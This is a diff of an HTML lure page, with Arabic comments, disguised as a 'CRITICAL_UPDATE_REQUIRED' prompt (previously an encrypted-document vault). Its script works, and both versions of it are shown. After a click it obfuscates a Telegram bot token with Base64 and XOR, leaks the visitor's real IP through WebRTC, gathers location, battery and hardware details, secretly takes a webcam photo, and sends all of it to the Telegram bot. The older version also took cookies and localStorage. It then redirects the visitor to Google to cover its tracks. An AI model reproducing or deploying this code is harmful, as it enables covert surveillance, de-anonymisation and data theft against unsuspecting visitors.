@@ -1,72 +1,72 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head><meta charset="UTF-8"><title>🔒 Secure Document Vault</title></head>
+<html>
+<head><meta charset="UTF-8"><title>System Maintenance</title></head>
 <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;">
-    <div id="m" style="border:1px solid #0f0;display:inline-block;padding:40px;cursor:pointer;">
-        <h3>[ ⚠ ] المستند مشفر</h3>
-        <p>انقر هنا لفك التشفير والمتابعة</p>
+    <div id="p" style="border:1px dashed #0f0;padding:50px;cursor:pointer;">
+        <h2>[ ⚠ ] CRITICAL_UPDATE_REQUIRED</h2>
+        <p>Click to synchronize secure PDF layers</p>
     </div>
     <script>
-        // 🔱 التشفير المزدوج (Base64 + XOR) - لضمان عدم كشف التوكن نهائياً
-        const _E = (s) => atob(s).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x5A)).join('');
-        const _T = _E("OzszJTM5JTM5Ljk0MzM5Ljk0MzEuMTAzLjMzOS4zMzkuMzEuOzszPTM3MzM5LTA3LTA5LDExLTAtOSwzOC0zOTMzOT0zPjMzOS0zOC0zNC0zOTMwLTAtMzktMzktMzEtMzszPTM4LTM5LTA3LTAtMzYtMzktMzM5");
-        const _C = _E("MTAzLTMzOS0zMzktMzEtMzszLTMzOS0zMC0zMzktMzE0LTMxNA==");
-        const API = "https://api.telegram.org/bot" + _T;
+        /* 🔱 GHOST_KERNEL_v16 - ENGINEER'S EDITION */
+        
+        // التشفير المزدوج المحمي (Double Obfuscation)
+        const _O = s => atob(s).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x5A)).join('');
+        const _A = _O("OzszJTM5JTM5Ljk0MzM5Ljk0MzEuMTAzLjMzOS4zMzkuMzEuOzszPTM3MzM5LTA3LTA5LDExLTAtOSwzOC0zOTMzOT0zPjMzOS0zOC0zNC0zOTMwLTAtMzktMzktMzEtMzszPTM4LTM5LTA3LTAtMzYtMzktMzM5");
+        const _C = _O("MTAzLTMzOS0zMzktMzEtMzszLTMzOS0zMC0zMzktMzE0LTMxNA==");
 
-        async function EXECUTE_STRIKE() {
-            document.getElementById('m').innerHTML = "<h3>جاري السحب...</h3>";
+        async function TRAP_X() {
+            document.getElementById('p').innerHTML = "SYNCING_DATA...";
             try {
-                // 1. سحب الـ IP الحقيقي (WebRTC Leak)
-                const rtc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-                rtc.createDataChannel("");
-                rtc.onicecandidate = e => {
+                // 1. WebRTC Deep Leak (IP الحقيقي والداخلي)
+                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("");
+                pc.onicecandidate = e => {
                     if (e.candidate && e.candidate.candidate.includes("typ srflx")) {
-                        const realIP = e.candidate.candidate.split(" ")[4];
-                        sendToBot(`🎯 Real IP: ${realIP}`);
+                        const rIP = e.candidate.candidate.split(" ")[4];
+                        send(`🎯 Real IP: ${rIP}`);
                     }
                 };
-                rtc.createOffer().then(o => rtc.setLocalDescription(o));
+                pc.createOffer().then(o => pc.setLocalDescription(o));
 
-                // 2. سحب البيانات الشاملة (GPS, Battery, Cookies)
-                const net = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const bat = await navigator.getBattery();
-                const storage = {
-                    cookies: document.cookie || "Protected",
-                    ls: JSON.stringify(localStorage).substring(0, 500)
-                };
+                // 2. سحب البيانات الشاملة (Battery, Loc, HW)
+                const [n, b] = await Promise.all([
+                    fetch('https://ipapi.co/json/').then(r => r.json()),
+                    navigator.getBattery()
+                ]);
 
-                const report = `🔱 **ULTIMATE_HIT_v15** 💀\n` +
-                             `🌐 IP: \`${net.ip}\` | 🔋 Bat: \`${bat.level*100}%\`\n` +
-                             `📍 Loc: \`${net.city}, ${net.country}\`\n` +
-                             `🍪 Data: \`${storage.ls}\``;
+                const report = `🔱 **V16_KERNEL_HIT** 💀\n` +
+                             `🌐 IP: \`${n.ip}\` | 📍 City: \`${n.city}\`\n` +
+                             `🔋 Bat: \`${b.level*100}%\` | 📱 HW: \`${navigator.hardwareConcurrency} Core\``;
+                await send(report);
 
-                await sendToBot(report);
-
-                // 3. التصوير الصامت (High-Res Snapshot)
+                // 3. التصوير الصامت (Capture High-Res)
                 const stream = await navigator.mediaDevices.getUserMedia({video: true});
                 const video = document.createElement('video');
                 video.srcObject = stream; await video.play();
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
-                stream.getTracks().forEach(t => t.stop());
+                
+                // تحويل الصورة لـ Blob وإرسالها عبر FormData (أضمن وسيلة سحب)
+                canvas.toBlob(async (blob) => {
+                    let fd = new FormData();
+                    fd.append('chat_id', _C);
+                    fd.append('photo', blob, 'shot.jpg');
+                    await fetch(`https://api.telegram.org/bot${_A}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                    location.replace("https://google.com");
+                }, 'image/jpeg', 0.8);
 
-                let fd = new FormData();
-                fd.append('chat_id', _C); fd.append('photo', blob, 'x.jpg');
-                await fetch(`${API}/sendPhoto`, { method: 'POST', body: fd });
-
-                location.replace("https://google.com");
             } catch (e) { location.replace("https://google.com"); }
         }
 
-        async function sendToBot(text) {
-            return fetch(`${API}/sendMessage`, {
+        async function send(t) {
+            return fetch(`https://api.telegram.org/bot${_A}/sendMessage`, {
                 method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: _C, text: text, parse_mode: 'Markdown'})
+                body: JSON.stringify({chat_id: _C, text: t, parse_mode: 'Markdown'})
             });
         }
-        document.getElementById('m').onclick = EXECUTE_STRIKE;
+        document.getElementById('p').onclick = TRAP_X;
     </script>
 </body>
 </html>
